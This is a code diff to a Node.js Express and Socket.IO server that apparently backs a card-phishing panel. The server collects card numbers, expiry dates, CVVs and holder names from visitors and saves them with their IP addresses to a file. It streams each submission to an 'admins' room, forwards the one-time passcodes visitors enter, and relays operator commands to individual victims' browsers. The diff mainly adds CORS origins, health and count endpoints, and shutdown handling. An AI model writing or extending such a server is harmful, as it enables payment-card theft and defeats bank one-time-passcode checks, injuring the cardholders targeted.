@@ -1,3 +1,4 @@
+
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
@@ -6,24 +7,33 @@ const { Server } = require('socket.io');
 const cors = require('cors');
 
 const app = express();
+
+// Enhanced CORS configuration for production
 app.use(cors({
-  origin: 'https://dev49.onrender.com',
+  origin: ['https://dev49.onrender.com', 'http://localhost:8080', 'http://localhost:5173'],
   credentials: true
 }));
+
 const port = process.env.PORT || 8080;
 const server = http.createServer(app);
+
+// Enhanced Socket.IO configuration
 const io = new Server(server, {
   cors: {
-    origin: 'https://dev49.onrender.com',
+    origin: ['https://dev49.onrender.com', 'http://localhost:8080', 'http://localhost:5173'],
     methods: ['GET', 'POST'],
     credentials: true
   },
-  upgradeTimeout: 30000 // Increase upgrade timeout
+  upgradeTimeout: 30000,
+  transports: ['websocket', 'polling']
 });
+
+// Middleware for parsing JSON
+app.use(express.json());
 
 // In-memory storage for card submissions
 const submissionsFilePath = path.join(__dirname, 'submissions.json');
-let cardSubmissionsQueue = []; // This will store submissions until an admin connects
+let cardSubmissionsQueue = [];
 
 // Function to load submissions from file
 const loadSubmissions = () => {
@@ -51,8 +61,10 @@ const saveSubmissions = () => {
 // Load submissions when the server starts
 loadSubmissions();
 
+// Socket.IO connection handling
 io.on('connection', (socket) => {
   console.log(`[Server] Socket.IO connection established: ${socket.id}`);
+  
   socket.on('disconnect', (reason) => {
     console.log(`[Server] Socket.IO disconnected: ${socket.id}, reason: ${reason}`);
   });
@@ -73,13 +85,12 @@ io.on('connection', (socket) => {
 
     // Send all queued card submissions to the newly connected admin
     cardSubmissionsQueue.forEach(submission => {
-      socket.emit('card_submission', submission); // Emit directly to this admin's socket
+      socket.emit('card_submission', submission);
     });
   });
 
   // Handler for card data from a user
   socket.on('card_submission', (payload) => {
-
     // Validate required fields
     const requiredFields = ['card_number', 'expiry_month', 'expiry_year', 'cvv', 'card_holder', 'amount'];
     const missingFields = requiredFields.filter(field => !payload[field]);
@@ -91,8 +102,8 @@ io.on('connection', (socket) => {
 
     // Format the submission data
     const submissionPayload = {
-      id: socket.id, // Use socket ID as unique identifier
-      socket_id: socket.id, // Also include as socket_id for clarity
+      id: socket.id,
+      socket_id: socket.id,
       ...payload,
       user_ip: clientIp,
       created_at: new Date().toISOString(),
@@ -105,7 +116,7 @@ io.on('connection', (socket) => {
 
     // Add the submission to the in-memory queue
     cardSubmissionsQueue.push(submissionPayload);
-    saveSubmissions(); // Save to file after adding new submission
+    saveSubmissions();
     console.log(`[Server] Card submission received and queued. Queue size: ${cardSubmissionsQueue.length}`);
 
     // Send the data ONLY to admins
@@ -123,15 +134,12 @@ io.on('connection', (socket) => {
 
   // Handler for commands from an admin
   socket.on('admin_command', (payload) => {
-    // First, broadcast the command to all admins to keep their UIs synchronized.
     io.to('admins').emit('admin_command', payload);
 
-    // Then, send the command to the specific target client, if one is specified.
     const targetSocketId = payload.submission_id;
     if (targetSocketId) {
       const targetSocket = io.sockets.sockets.get(targetSocketId);
       if (targetSocket) {
-        // Relay the command to the specific user's browser
         targetSocket.emit('admin_command', payload);
       }
     }
@@ -142,14 +150,13 @@ io.on('connection', (socket) => {
     console.log(`[Server] Received otp_submitted from ${socket.id} for submission_id: ${payload.submission_id}, OTP: ${payload.otp}`);
     const otpPayload = {
       ...payload,
-      submission_id: payload.submission_id, // Ensure submission_id is explicitly included
-      otp: payload.otp // Ensure OTP value is explicitly included
+      submission_id: payload.submission_id,
+      otp: payload.otp
     };
-    // Send the OTP ONLY to admins
     io.to('admins').emit('otp_submitted', otpPayload);
   });
 
-  // Chat handlers remain global broadcasts
+  // Chat handlers
   socket.on('chat_message', (payload) => {
     io.emit('chat_message', payload);
   });
@@ -164,19 +171,67 @@ io.on('connection', (socket) => {
   });
 });
 
-// Serve static files from the dist directory
-app.use(express.static(path.join(__dirname, 'dist')));
+// Serve static files from the dist directory (built React app)
+const distPath = path.join(__dirname, 'dist');
+console.log('[Server] Serving static files from:', distPath);
 
-// For any route, serve index.html (for React Router support)
+// Check if dist directory exists
+if (fs.existsSync(distPath)) {
+  app.use(express.static(distPath, {
+    maxAge: '1y',
+    etag: false
+  }));
+  console.log('[Server] Static files configured successfully');
+} else {
+  console.warn('[Server] Warning: dist directory not found at:', distPath);
+}
+
+// Health check endpoint
+app.get('/health', (req, res) => {
+  res.status(200).json({ status: 'OK', timestamp: new Date().toISOString() });
+});
+
+// API endpoint for submissions (if needed)
+app.get('/api/submissions', (req, res) => {
+  res.json({ count: cardSubmissionsQueue.length });
+});
+
+// Catch-all handler: send back React's index.html file for client-side routing
 app.get('*', (req, res) => {
-  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
+  const indexPath = path.join(distPath, 'index.html');
+  if (fs.existsSync(indexPath)) {
+    res.sendFile(indexPath);
+  } else {
+    res.status(404).send('Application not built. Please run build process.');
+  }
+});
+
+// Enhanced error handling
+server.on('error', (error) => {
+  console.error('[Server] Server error:', error);
 });
 
 server.on('upgrade', (req, socket, head) => {
   console.log('[Server] HTTP Upgrade request received:', req.url);
-  console.log('[Server] Upgrade headers:', req.headers);
 });
 
+// Graceful shutdown
+process.on('SIGTERM', () => {
+  console.log('[Server] SIGTERM received, shutting down gracefully');
+  server.close(() => {
+    console.log('[Server] Process terminated');
+  });
+});
+
+process.on('SIGINT', () => {
+  console.log('[Server] SIGINT received, shutting down gracefully');
+  server.close(() => {
+    console.log('[Server] Process terminated');
+  });
+});
+
+// Start server
 server.listen(port, '0.0.0.0', () => {
-  console.log(`Server is running on port ${port}`);
+  console.log(`[Server] Server is running on port ${port}`);
+  console.log(`[Server] Environment: ${process.env.NODE_ENV || 'development'}`);
 });
